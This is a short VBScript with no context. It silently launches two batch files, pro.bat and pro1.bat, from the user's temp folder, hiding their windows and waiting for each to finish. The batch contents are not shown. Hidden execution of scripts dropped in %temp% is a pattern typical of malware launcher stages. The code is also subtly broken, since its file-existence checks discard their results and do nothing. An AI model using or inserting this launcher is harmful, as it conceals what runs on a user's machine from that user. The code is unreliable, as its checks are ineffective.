Set objShell = WScript.CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

proBatPath = "%temp%\pro.bat"
pro1BatPath = "%temp%\pro1.bat"

objFSO.FileExists(proBatPath) 
objShell.Run proBatPath, 0, True
objFSO.FileExists(pro1BatPath) 
objShell.Run pro1BatPath, 0, True
